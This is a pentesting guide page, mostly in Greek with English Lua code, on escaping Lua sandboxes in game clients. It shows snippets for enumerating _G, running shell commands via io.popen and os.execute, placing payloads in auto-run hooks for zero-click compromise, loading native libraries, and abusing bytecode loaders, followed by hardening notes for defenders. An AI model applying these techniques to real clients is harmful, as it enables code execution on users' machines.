# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει πρακτικές τεχνικές για να απαριθμήσετε και να διαφύγετε από Lua "sandboxes" ενσωματωμένα σε εφαρμογές (ιδιαίτερα game clients, plugins ή in-app scripting engines). Πολλές engines εκθέτουν ένα περιορισμένο περιβάλλον Lua, αλλά αφήνουν ισχυρά globals προσβάσιμα που επιτρέπουν εκτέλεση αυθαίρετων εντολών ή ακόμη και native memory corruption όταν bytecode loaders είναι εκτεθειμένοι.

Βασικές ιδέες:
- Αντιμετωπίστε τη VM ως άγνωστο περιβάλλον: απαριθμήστε το _G και ανακαλύψτε ποιες επικίνδυνες primitives είναι προσβάσιμες.
- Όταν stdout/print είναι μπλοκαρισμένα, εκμεταλλευτείτε οποιοδήποτε in-VM UI/IPC κανάλι ως output sink για να παρατηρήσετε τα αποτελέσματα.
- Εάν io/os είναι εκτεθειμένα, συχνά έχετε άμεση εκτέλεση εντολών (io.popen, os.execute).
- Εάν load/loadstring/loadfile είναι εκτεθειμένα, η εκτέλεση επιμελημένου Lua bytecode μπορεί να υπονομεύσει την ασφάλεια της μνήμης σε ορισμένες εκδόσεις (≤5.1 verifiers είναι bypassable· 5.2 αφαίρεσε τον verifier), επιτρέποντας προηγμένη εκμετάλλευση.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Αν δεν υπάρχει διαθέσιμο print(), επαναχρησιμοποίησε in-VM κανάλια. Παράδειγμα από ένα MMO housing script VM όπου η έξοδος του chat λειτουργεί μόνο μετά από μια sound call· το ακόλουθο δημιουργεί μια αξιόπιστη συνάρτηση εξόδου:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Γενικεύστε αυτό το pattern για τον στόχο σας: οποιοδήποτε textbox, toast, logger, ή UI callback που δέχεται strings μπορεί να λειτουργήσει ως stdout για reconnaissance.

## Άμεση εκτέλεση εντολών εάν io/os είναι εκτεθειμένα

Αν το sandbox εξακολουθεί να εκθέτει τις standard libraries io ή os, πιθανότατα έχετε άμεση command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes:
- Η εκτέλεση γίνεται μέσα στην client process; πολλά anti-cheat/antidebug layers που μπλοκάρουν external debuggers δεν θα αποτρέψουν in-VM process creation.
- Επίσης ελέγξτε: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

Αν η host application προωθεί scripts σε clients και το VM εκθέτει auto-run hooks (π.χ. OnInit/OnLoad/OnEnter), τοποθετήστε το payload σας εκεί για drive-by compromise αμέσως μόλις φορτωθεί το script:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Κάθε αντίστοιχο callback (OnLoad, OnEnter, etc.) γενικεύει αυτή την τεχνική όταν scripts μεταδίδονται και εκτελούνται στον client αυτόματα.

## Επικίνδυνα primitives για να εντοπίσετε κατά την recon

Κατά την enumeration του _G, ψάξτε ειδικά για:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: εκτελεί source ή bytecode; υποστηρίζει φόρτωση μη αξιόπιστου bytecode.
- package, package.loadlib, require: φόρτωση δυναμικών βιβλιοθηκών και επιφάνεια module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, και hooks.
- LuaJIT-only: ffi.cdef, ffi.load για άμεση κλήση native code.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Προαιρετική κλιμάκωση: κατάχρηση των Lua bytecode loaders

Όταν τα load/loadstring/loadfile είναι προσβάσιμα αλλά io/os είναι περιορισμένα, η εκτέλεση χειροποίητου Lua bytecode μπορεί να οδηγήσει σε memory disclosure και corruption primitives. Κύρια σημεία:
- Το Lua ≤ 5.1 περιελάμβανε έναν bytecode verifier με γνωστές παρακάμψεις.
- Το Lua 5.2 αφαίρεσε πλήρως τον verifier (επίσημη θέση: οι εφαρμογές θα πρέπει απλά να απορρίπτουν precompiled chunks), διευρύνοντας την attack surface αν το bytecode loading δεν απαγορεύεται.
- Τυπικά workflows: leak pointers μέσω in-VM output, δημιουργία bytecode που προκαλεί type confusions (π.χ. γύρω από FORLOOP ή άλλα opcodes), και στη συνέχεια pivot σε arbitrary read/write ή native code execution.

Αυτή η διαδρομή εξαρτάται από το engine/version και απαιτεί RE. Δείτε τις αναφορές για σε βάθος αναλύσεις, exploitation primitives και παραδείγματα gadgetry σε games.

## Σημειώσεις ανίχνευσης και ενίσχυσης (για defenders)

- Server side: reject ή επαναγράψτε τα user scripts; allowlist ασφαλή APIs; αφαιρέστε ή bind-empty τα io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: τρέξτε το Lua με ένα ελάχιστο _ENV, απαγορεύστε το bytecode loading, επανεισάγετε έναν strict bytecode verifier ή signature checks, και μπλοκάρετε τη δημιουργία process από τη διαδικασία του client.
- Telemetry: ειδοποίηση σε gameclient → child process creation λίγο μετά το script load; συσχετίστε με UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
